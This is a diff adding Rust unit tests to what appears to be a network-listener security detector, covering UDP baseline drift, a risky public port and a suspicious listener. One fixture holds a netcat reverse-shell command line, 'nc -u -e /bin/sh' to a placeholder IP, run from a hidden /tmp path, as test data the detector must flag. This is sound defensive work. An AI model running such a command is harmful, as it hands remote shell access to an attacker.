@@ -23,6 +23,32 @@ fn reports_new_public_port_from_baseline_drift() {
 }
 
 #[test]
+fn suppresses_generic_udp_high_port_from_baseline_drift() {
+    let findings = detect_with_default_config(vec![udp_socket_event("baseline", 51659)]);
+    assert!(findings.is_empty());
+}
+
+#[test]
+fn reports_high_risk_udp_public_port() {
+    let findings = detect_with_default_config(vec![udp_socket_event("network", 11211)]);
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "CONFIG-003");
+}
+
+#[test]
+fn reports_suspicious_udp_listener_process() {
+    let findings = detect_with_default_config(vec![RawEvent::new("network", "listening_socket")
+        .with_field("protocol", "udp6")
+        .with_field("local_addr", "::")
+        .with_field("local_port", "51659")
+        .with_field("process_name", "sh")
+        .with_field("executable", "/tmp/.x/sh")
+        .with_field("cmdline", "sh -c nc -u -e /bin/sh 1.2.3.4 4444")]);
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-003");
+}
+
+#[test]
 fn reports_suspicious_process_on_expected_web_port() {
     let findings = detect_with_default_config(vec![RawEvent::new("network", "listening_socket")
         .with_field("protocol", "tcp")
@@ -118,4 +144,13 @@ fn socket_event(source: &str, port: u16) -> RawEvent {
         .with_field("protocol", "tcp")
         .with_field("local_addr", "0.0.0.0")
         .with_field("local_port", port.to_string())
+}
+
+fn udp_socket_event(source: &str, port: u16) -> RawEvent {
+    RawEvent::new(source, "listening_socket")
+        .with_field("protocol", "udp6")
+        .with_field("local_addr", "::")
+        .with_field("local_port", port.to_string())
+        .with_field("process_name", "v2ray")
+        .with_field("executable", "/usr/bin/v2ray/v2ray")
 }
